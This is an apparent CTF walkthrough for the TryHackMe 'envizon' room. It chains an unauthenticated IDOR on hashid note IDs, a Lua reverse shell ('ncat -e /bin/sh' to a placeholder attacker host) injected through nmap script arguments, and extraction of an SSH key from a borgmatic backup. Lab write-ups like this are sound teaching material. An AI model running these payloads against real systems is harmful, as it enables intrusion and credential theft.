**THM envizon**
Target: 10.48.142.121:3000

---

## Overview

Envizon is a real-world network visualization and vulnerability management tool (by evait-security) repurposed as a CTF room. The theme is "Attacking the Pentesters" — finding vulnerabilities in the tool pentesters use. The app runs on port 3000.

**Vulnerability types:** IDOR, Command Injection, Improper Input Validation, Insecure Backup Management

---

## Enumeration

Port 3000 hosts the Envizon web app. Access `/notes/1` — no authentication required (IDOR). The note hints at a stored password in note ID **380**.

---

## Step 1 — Retrieve Login Password (Hashids IDOR)

Envizon obscures note IDs using hashids with:
- Secret: `Note`
- Min length: `30`

Encode note ID 380 to get its hashid:

```bash
./bashids -e -s "Note" -l 30 380
```

Access `/notes/<hashid>` — the note contains the application password. Log in.

---

## Step 2 — Create Malicious Lua Script

Envizon allows uploading custom nmap scripts (XML/Lua). Create a reverse shell payload:

```lua
-- shell.lua
os.execute("ncat -e /bin/sh <attacker_ip> <port>")
```

---

## Step 3 — Upload and Execute via Nmap Command Injection

1. Upload `shell.lua` via the file upload functionality — lands in `/nmap/uploads/`
2. Set up listener: `nc -lvnp <port>`
3. In Manual Scan, inject into nmap parameters:
   ```
   --script /nmap/uploads/shell.lua
   ```
4. Trigger the scan — receive reverse shell (root)

---

## Step 4 — local.txt

```bash
cat /root/local.txt
```

---

## Step 5 — Borgmatic Backup Extraction

Find backup config:

```bash
cat /etc/borgmatic/config.yaml
```

Contains the passphrase and backup location (`/var/backup/`).

List archives and extract:

```bash
borgmatic list
borgmatic extract --archive envizon-2020-09-30T23:25:30.466049
```

Recover SSH private key from restored `.ssh/id_ed25519`.

---

## Step 6 — Persistent Access & root.txt

```bash
ssh -i id_ed25519 root@10.48.142.121
cat /root/root.txt
```

---

## Flags

| Flag | Location |
|------|----------|
| local.txt | `/root/local.txt` — via reverse shell |
| root.txt | `/root/root.txt` — via SSH after backup extraction |
